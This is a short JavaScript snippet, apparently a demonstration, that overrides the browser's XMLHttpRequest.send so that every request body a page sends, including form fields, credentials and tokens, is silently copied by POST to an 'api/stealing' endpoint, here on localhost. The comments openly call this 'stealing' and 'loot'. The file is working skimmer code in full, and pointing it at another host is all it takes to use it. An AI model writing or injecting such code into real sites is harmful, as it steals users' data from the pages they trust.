(function (window, document) {
  "use strict";

  // Grab a reference to the original function
  var originalSendFn = window.XMLHttpRequest.prototype.send;

  // DuckPunch a new function for Xhr.send()
  window.XMLHttpRequest.prototype.send = function () {

    // Normalize the arguments
    var args = Array.prototype.slice.call(arguments, 0);

    // Prevent infinite recursion, stealing our own loot.
    if (args[1] !== "DONTSTEAL") {

      // 1: Mirror the postData to our own endpoint,
      // 2: Profit?
      var infoJackRequest = new XMLHttpRequest();
      infoJackRequest.open("POST", "http://localhost:3002/api/stealing");

      // Send through to the original function with our
      // flag to prevent recursion
      infoJackRequest.send(args[0], "DONTSTEAL");

      // Diabolical Laughter
      console.log("Muhahaha..");
    }

    return originalSendFn.apply(this, args);
  }

})(window, document);